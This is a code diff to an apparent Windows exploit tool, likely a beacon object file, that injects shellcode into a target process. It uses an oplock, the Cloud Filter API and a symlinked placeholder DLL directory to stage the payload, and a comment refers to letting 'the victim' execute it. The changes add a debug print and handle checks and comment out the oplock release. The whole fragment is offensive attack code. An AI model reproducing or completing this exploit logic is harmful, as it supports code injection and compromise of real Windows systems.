@@ -75,8 +75,11 @@ BOOL AcquireOplock()
 
 void ReleaseOplock()
 {
+    internal_printf("\n\nhOplockfile = %llx\n\n%llx\n\n", hOplockFile, hOplockEvent);
+    if (hOplockFile != INVALID_HANDLE_VALUE)
     KERNEL32$CloseHandle(hOplockFile);
     hOplockFile = NULL;
+    if(hOplockEvent && hOplockEvent != INVALID_HANDLE_VALUE)
     KERNEL32$CloseHandle(hOplockEvent);
     hOplockEvent = NULL;
 }
@@ -184,7 +187,7 @@ VOID CALLBACK FetchDataCallback (
         }
 
         // With the payload staged, release the oplock to allow the victim to execute
-        ReleaseOplock();
+        //ReleaseOplock();
     }
 
     KERNEL32$ReleaseSRWLockExclusive(&sFetchDataCallback);
@@ -548,7 +551,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     result = 0;
 
 Cleanup:
-    ReleaseOplock();
+    //ReleaseOplock();
     KERNEL32$Sleep(100);
     CLDAPI$CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
     CleanupSymlink();
